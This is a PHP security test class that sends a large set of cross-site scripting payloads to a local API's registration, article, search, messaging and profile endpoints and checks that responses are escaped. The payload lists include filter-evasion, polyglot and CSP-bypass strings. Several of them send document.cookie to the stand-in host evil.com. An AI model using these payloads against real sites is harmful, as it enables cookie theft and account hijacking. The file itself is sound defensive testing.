<?php

/**
 * Cross-Site Scripting (XSS) Security Tests
 * Tests various XSS attack vectors to ensure proper input sanitization and output encoding
 */
class XSSTest extends TestCase
{
    private $baseUrl;
    private $client;
    private $authToken;
    
    protected function setUp(): void
    {
        parent::setUp();
        
        $this->baseUrl = 'http://localhost:8000/api';
        
        // Initialize HTTP client
        $this->client = new class {
            public function request($method, $url, $options = []) {
                $ch = curl_init();
                
                curl_setopt_array($ch, [
                    CURLOPT_URL => $url,
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_CUSTOMREQUEST => $method,
                    CURLOPT_HTTPHEADER => $options['headers'] ?? [],
                    CURLOPT_POSTFIELDS => isset($options['json']) ? json_encode($options['json']) : ($options['body'] ?? ''),
                    CURLOPT_TIMEOUT => 30,
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_FOLLOWLOCATION => true
                ]);
                
                $response = curl_exec($ch);
                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                $error = curl_error($ch);
                
                curl_close($ch);
                
                if ($error) {
                    throw new Exception("CURL Error: " . $error);
                }
                
                return [
                    'status' => $httpCode,
                    'body' => $response,
                    'data' => json_decode($response, true) ?? []
                ];
            }
        };
        
        // Create a test user and get auth token
        $this->createTestUser();
    }
    
    private function createTestUser()
    {
        $userData = [
            'username' => 'xsstest_' . uniqid(),
            'email' => 'xsstest_' . uniqid() . '@example.com',
            'password' => 'SecurePassword123!',
            'first_name' => 'XSS',
            'last_name' => 'Test'
        ];
        
        $response = $this->client->request('POST', $this->baseUrl . '/auth/register', [
            'json' => $userData,
            'headers' => ['Content-Type: application/json']
        ]);
        
        if ($response['status'] === 201 && isset($response['data']['token'])) {
            $this->authToken = $response['data']['token'];
        }
    }
    
    public function testBasicXSSInUserRegistration()
    {
        $xssPayloads = [
            // Basic script injection
            '<script>alert("XSS")</script>',
            '<script>alert(\'XSS\')</script>',
            '<script>alert(`XSS`)</script>',
            
            // Event handlers
            '<img src="x" onerror="alert(\'XSS\')">',
            '<body onload="alert(\'XSS\')">',
            '<input type="text" onfocus="alert(\'XSS\')" autofocus>',
            '<svg onload="alert(\'XSS\')">',
            
            // JavaScript pseudo-protocol
            'javascript:alert("XSS")',
            'javascript:void(0);alert("XSS")',
            
            // Data URIs
            'data:text/html,<script>alert("XSS")</script>',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
            
            // Encoded payloads
            '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E',
            '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
            
            // Alternative script tags
            '<SCRIPT>alert("XSS")</SCRIPT>',
            '<script type="text/javascript">alert("XSS")</script>',
            '<script language="javascript">alert("XSS")</script>'
        ];
        
        $fields = ['username', 'first_name', 'last_name', 'email'];
        
        foreach ($fields as $field) {
            foreach ($xssPayloads as $payload) {
                $userData = [
                    'username' => 'testuser_' . uniqid(),
                    'email' => 'test_' . uniqid() . '@example.com',
                    'password' => 'SecurePassword123!',
                    'first_name' => 'Test',
                    'last_name' => 'User'
                ];
                
                $userData[$field] = $payload;
                
                $response = $this->client->request('POST', $this->baseUrl . '/auth/register', [
                    'json' => $userData,
                    'headers' => ['Content-Type: application/json']
                ]);
                
                // XSS should be prevented/sanitized
                $this->assertXSSNotExecuted($response['body'], $payload, $field);
                
                // If registration succeeds, the data should be properly encoded
                if ($response['status'] === 201) {
                    $this->assertXSSProperlyEncoded($response['body'], $payload, $field);
                }
            }
        }
    }
    
    public function testXSSInArticleCreation()
    {
        if (!$this->authToken) {
            $this->markTestSkipped('No auth token available for article creation test');
            return;
        }
        
        $xssPayloads = [
            // Persistent XSS in article title
            '<script>document.cookie="stolen="+document.cookie;</script>',
            '<img src=x onerror="fetch(\'/steal?cookie=\'+document.cookie)">',
            
            // XSS in article description
            '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            '<object data="data:text/html,<script>alert(\'XSS\')</script>"></object>',
            '<embed src="data:text/html,<script>alert(\'XSS\')</script>">',
            
            // DOM-based XSS
            '<div id="xss" onclick="eval(this.innerHTML)">alert("XSS")</div>',
            '<input type="text" value="" onfocus="alert(\'XSS\')" autofocus>',
            
            // CSS injection
            '<style>body{background:url("javascript:alert(\'XSS\')")}</style>',
            '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
            
            // HTML5 XSS
            '<video><source onerror="alert(\'XSS\')">',
            '<audio src="x" onerror="alert(\'XSS\')">',
            '<details open ontoggle="alert(\'XSS\')">',
            
            // Filter evasion
            '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
            '<img src="" onerror="a=\'aler\';b=\'t\';c=\'XSS\';eval(a+b+\'(\\\'\'+c+\\'\\\')\')">',
            
            // Polyglot payloads
            'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//>',
            '"><svg/onload=alert(/XSS/)>'
        ];
        
        foreach ($xssPayloads as $payload) {
            $articleData = [
                'title' => $payload,
                'description' => 'Normal description',
                'price' => 100,
                'category_id' => 1
            ];
            
            $response = $this->client->request('POST', $this->baseUrl . '/articles', [
                'json' => $articleData,
                'headers' => [
                    'Content-Type: application/json',
                    'Authorization: Bearer ' . $this->authToken
                ]
            ]);
            
            $this->assertXSSNotExecuted($response['body'], $payload, 'article title');
            
            if ($response['status'] === 201) {
                $this->assertXSSProperlyEncoded($response['body'], $payload, 'article title');
            }
            
            // Test XSS in description
            $articleData = [
                'title' => 'Normal title',
                'description' => $payload,
                'price' => 100,
                'category_id' => 1
            ];
            
            $response = $this->client->request('POST', $this->baseUrl . '/articles', [
                'json' => $articleData,
                'headers' => [
                    'Content-Type: application/json',
                    'Authorization: Bearer ' . $this->authToken
                ]
            ]);
            
            $this->assertXSSNotExecuted($response['body'], $payload, 'article description');
        }
    }
    
    public function testXSSInSearchParameters()
    {
        $xssPayloads = [
            '<script>alert("XSS")</script>',
            'javascript:alert("XSS")',
            '<img src=x onerror=alert("XSS")>',
            '"><script>alert("XSS")</script>',
            '\'-alert("XSS")-\'',
            '${alert("XSS")}',
            '{{constructor.constructor("alert(\\"XSS\\")")()}}'
        ];
        
        foreach ($xssPayloads as $payload) {
            // Test XSS in search query
            $response = $this->client->request('GET', 
                $this->baseUrl . '/articles/search?q=' . urlencode($payload), [
                'headers' => ['Content-Type: application/json']
            ]);
            
            $this->assertXSSNotExecuted($response['body'], $payload, 'search query');
            
            // Test XSS in category filter
            $response = $this->client->request('GET', 
                $this->baseUrl . '/articles?category=' . urlencode($payload), [
                'headers' => ['Content-Type: application/json']
            ]);
            
            $this->assertXSSNotExecuted($response['body'], $payload, 'category filter');
            
            // Test XSS in sort parameter
            $response = $this->client->request('GET', 
                $this->baseUrl . '/articles?sort=' . urlencode($payload), [
                'headers' => ['Content-Type: application/json']
            ]);
            
            $this->assertXSSNotExecuted($response['body'], $payload, 'sort parameter');
        }
    }
    
    public function testXSSInMessageContent()
    {
        if (!$this->authToken) {
            $this->markTestSkipped('No auth token available for message test');
            return;
        }
        
        $xssPayloads = [
            // Message content XSS
            '<script>window.location="http://evil.com?cookie="+document.cookie</script>',
            '<img src="x" onerror="new Image().src=\'http://evil.com?cookie=\'+document.cookie">',
            '<iframe srcdoc="<script>parent.alert(\'XSS\')</script>"></iframe>',
            
            // Social engineering XSS
            'Click here: <a href="javascript:alert(\'XSS\')">Important Link</a>',
            '<form action="javascript:alert(\'XSS\')"><input type="submit" value="Click Me"></form>',
            
            // Markdown/BBCode injection (if supported)
            '[url=javascript:alert("XSS")]Click here[/url]',
            '[img]javascript:alert("XSS")[/img]',
            
            // Template injection
            '{{7*7}}',
            '${7*7}',
            '<%= 7*7 %>',
            '{%raw%}{{7*7}}{%endraw%}'
        ];
        
        foreach ($xssPayloads as $payload) {
            $messageData = [
                'recipient_id' => 1,
                'message' => $payload
            ];
            
            $response = $this->client->request('POST', $this->baseUrl . '/messages', [
                'json' => $messageData,
                'headers' => [
                    'Content-Type: application/json',
                    'Authorization: Bearer ' . $this->authToken
                ]
            ]);
            
            $this->assertXSSNotExecuted($response['body'], $payload, 'message content');
        }
    }
    
    public function testReflectedXSSInErrorMessages()
    {
        $xssPayloads = [
            '<script>alert("XSS")</script>',
            '"><img src=x onerror=alert("XSS")>',
            'javascript:alert("XSS")',
            '\'; alert("XSS"); var x=\'',
            '${alert("XSS")}'
        ];
        
        foreach ($xssPayloads as $payload) {
            // Test XSS reflected in 404 error
            $response = $this->client->request('GET', 
                $this->baseUrl . '/nonexistent/' . urlencode($payload), [
                'headers' => ['Content-Type: application/json']
            ]);
            
            $this->assertXSSNotExecuted($response['body'], $payload, '404 error');
            
            // Test XSS in validation error messages
            $invalidData = [
                'email' => $payload,
                'password' => 'short'
            ];
            
            $response = $this->client->request('POST', $this->baseUrl . '/auth/login', [
                'json' => $invalidData,
                'headers' => ['Content-Type: application/json']
            ]);
            
            $this->assertXSSNotExecuted($response['body'], $payload, 'validation error');
        }
    }
    
    public function testStoredXSSInUserProfile()
    {
        if (!$this->authToken) {
            $this->markTestSkipped('No auth token available for profile test');
            return;
        }
        
        $xssPayloads = [
            '<script>alert("Stored XSS")</script>',
            '<img src=x onerror="document.location=\'http://evil.com?cookie=\'+document.cookie">',
            '<svg onload="alert(\'Stored XSS\')">',
            '<iframe src="javascript:alert(\'Stored XSS\')"></iframe>'
        ];
        
        foreach ($xssPayloads as $payload) {
            $profileData = [
                'first_name' => $payload,
                'last_name' => 'Test',
                'bio' => 'User bio with potential XSS: ' . $payload
            ];
            
            $response = $this->client->request('PUT', $this->baseUrl . '/auth/profile', [
                'json' => $profileData,
                'headers' => [
                    'Content-Type: application/json',
                    'Authorization: Bearer ' . $this->authToken
                ]
            ]);
            
            $this->assertXSSNotExecuted($response['body'], $payload, 'profile update');
            
            // Check if stored XSS appears when retrieving profile
            $getResponse = $this->client->request('GET', $this->baseUrl . '/auth/me', [
                'headers' => [
                    'Content-Type: application/json',
                    'Authorization: Bearer ' . $this->authToken
                ]
            ]);
            
            $this->assertXSSNotExecuted($getResponse['body'], $payload, 'profile retrieval');
            $this->assertXSSProperlyEncoded($getResponse['body'], $payload, 'stored profile data');
        }
    }
    
    public function testXSSInHTTPHeaders()
    {
        $xssPayloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            'javascript:alert("XSS")',
        ];
        
        foreach ($xssPayloads as $payload) {
            // Test XSS in custom headers (if reflected)
            $response = $this->client->request('GET', $this->baseUrl . '/articles', [
                'headers' => [
                    'Content-Type: application/json',
                    'X-Custom-Header: ' . $payload,
                    'User-Agent: Mozilla/5.0 ' . $payload,
                    'Referer: http://example.com/' . urlencode($payload)
                ]
            ]);
            
            $this->assertXSSNotExecuted($response['body'], $payload, 'HTTP headers');
        }
    }
    
    public function testDOMXSSVulnerabilities()
    {
        // Test for potential DOM XSS by checking if dangerous sinks are used
        $response = $this->client->request('GET', $this->baseUrl . '/../index.html');
        
        if ($response['status'] === 200) {
            $jsContent = $response['body'];
            
            // Check for dangerous JavaScript patterns
            $dangerousPatterns = [
                '/innerHTML\s*=\s*[^;]+(?:location|search|hash|href)/i',
                '/document\.write\s*\([^)]*(?:location|search|hash|href)/i',
                '/eval\s*\([^)]*(?:location|search|hash|href)/i',
                '/setTimeout\s*\([^)]*(?:location|search|hash|href)/i',
                '/setInterval\s*\([^)]*(?:location|search|hash|href)/i',
                '/Function\s*\([^)]*(?:location|search|hash|href)/i',
                '/outerHTML\s*=\s*[^;]+(?:location|search|hash|href)/i'
            ];
            
            foreach ($dangerousPatterns as $pattern) {
                $this->assertDoesNotMatchRegularExpression($pattern, $jsContent, 
                    "Potentially dangerous DOM XSS pattern found: " . $pattern);
            }
        }
    }
    
    public function testCSPBypassAttempts()
    {
        $cspBypassPayloads = [
            // Base64 bypass
            '<script src="data:text/javascript;base64,YWxlcnQoJ1hTUycp"></script>',
            
            // JSONP bypass
            '<script src="https://example.com/jsonp?callback=alert"></script>',
            
            // Angular bypass (if Angular is used)
            '{{constructor.constructor(\'alert("XSS")\')()}}',
            '{{\$eval.constructor(\'alert("XSS")\')()}}',
            
            // React bypass (if React is used)
            '<div dangerouslySetInnerHTML={{__html: \'<img src=x onerror=alert("XSS")>\'}}></div>',
            
            // CSS injection for CSP bypass
            '<style>@import "data:text/css;base64,Ym9keSB7IGJhY2tncm91bmQ6IHVybCgnamF2YXNjcmlwdDphbGVydCgiWFNTIikiKTsgfQ==";</style>',
            
            // SVG bypass
            '<svg><script>alert("XSS")</script></svg>',
            '<svg><script href="data:text/javascript,alert(\'XSS\')"></script></svg>'
        ];
        
        foreach ($cspBypassPayloads as $payload) {
            $articleData = [
                'title' => 'CSP Bypass Test',
                'description' => $payload,
                'price' => 100,
                'category_id' => 1
            ];
            
            $response = $this->client->request('POST', $this->baseUrl . '/articles', [
                'json' => $articleData,
                'headers' => [
                    'Content-Type: application/json',
                    'Authorization: Bearer ' . $this->authToken
                ]
            ]);
            
            $this->assertXSSNotExecuted($response['body'], $payload, 'CSP bypass attempt');
        }
    }
    
    public function testXSSFilterEvasion()
    {
        $evasionPayloads = [
            // Case variation
            '<ScRiPt>alert("XSS")</ScRiPt>',
            '<SCRIPT>alert("XSS")</SCRIPT>',
            
            // Character encoding
            '<script>alert&#40;&#34;XSS&#34;&#41;</script>',
            '<script>alert%28%22XSS%22%29</script>',
            '<script>alert\\u0028\\u0022XSS\\u0022\\u0029</script>',
            
            // Null byte injection
            '<script>alert("XSS")</script>',
            
            // Comment obfuscation
            '<script>/*comment*/alert("XSS")/*comment*/</script>',
            '<script>alert(/*comment*/"XSS"/*comment*/)</script>',
            
            // Space and tab variations
            '<script\t>alert("XSS")</script>',
            '<script\n>alert("XSS")</script>',
            '<script\r>alert("XSS")</script>',
            
            // Attribute variations
            '<img src="x"onerror="alert(\'XSS\')">',
            '<img src="x" onerror =alert("XSS")>',
            '<img src="x" onerror= alert("XSS")>',
            
            // Quote variations
            '<script>alert("XSS")</script>',
            '<script>alert(\'XSS\')</script>',
            '<script>alert(`XSS`)</script>',
            '<img src=x onerror=alert("XSS")>',
            
            // Concatenation
            '<script>alert("X"+"SS")</script>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            
            // Function variations
            '<img src=x onerror=window["alert"]("XSS")>',
            '<img src=x onerror=window[\'alert\']("XSS")>',
            '<img src=x onerror=this["alert"]("XSS")>'
        ];
        
        foreach ($evasionPayloads as $payload) {
            $userData = [
                'username' => 'evasiontest_' . uniqid(),
                'email' => 'evasion_' . uniqid() . '@example.com',
                'password' => 'SecurePassword123!',
                'first_name' => $payload,
                'last_name' => 'Test'
            ];
            
            $response = $this->client->request('POST', $this->baseUrl . '/auth/register', [
                'json' => $userData,
                'headers' => ['Content-Type: application/json']
            ]);
            
            $this->assertXSSNotExecuted($response['body'], $payload, 'XSS filter evasion');
        }
    }
    
    private function assertXSSNotExecuted($responseBody, $payload, $context)
    {
        // Check for unescaped script tags and event handlers
        $dangerousPatterns = [
            '/<script[^>]*>.*?<\/script>/si',
            '/<script[^>]*>/i',
            '/on\w+\s*=\s*["\'][^"\']*["\']/',
            '/javascript:\s*[^"\'\s]/i',
            '/<iframe[^>]*src\s*=\s*["\']javascript:/i',
            '/<embed[^>]*src\s*=\s*["\']javascript:/i',
            '/<object[^>]*data\s*=\s*["\']javascript:/i'
        ];
        
        foreach ($dangerousPatterns as $pattern) {
            $this->assertDoesNotMatchRegularExpression($pattern, $responseBody, 
                "Dangerous XSS pattern found in response for payload: {$payload} in context: {$context}");
        }
        
        // Check if raw payload appears unescaped
        if (strpos($payload, '<script') !== false || strpos($payload, 'javascript:') !== false) {
            $this->assertStringNotContainsString($payload, $responseBody, 
                "Raw XSS payload found unescaped in response: {$payload} in context: {$context}");
        }
    }
    
    private function assertXSSProperlyEncoded($responseBody, $payload, $context)
    {
        // Check if dangerous characters are properly encoded
        if (strpos($payload, '<') !== false) {
            $this->assertStringContainsString('&lt;', $responseBody, 
                "< character should be HTML encoded in context: {$context}");
        }
        
        if (strpos($payload, '>') !== false) {
            $this->assertStringContainsString('&gt;', $responseBody, 
                "> character should be HTML encoded in context: {$context}");
        }
        
        if (strpos($payload, '"') !== false) {
            $this->assertTrue(
                strpos($responseBody, '&quot;') !== false || strpos($responseBody, '&#34;') !== false,
                "Quote character should be HTML encoded in context: {$context}"
            );
        }
        
        if (strpos($payload, "'") !== false) {
            $this->assertTrue(
                strpos($responseBody, '&#39;') !== false || strpos($responseBody, '&#x27;') !== false,
                "Single quote should be HTML encoded in context: {$context}"
            );
        }
    }
}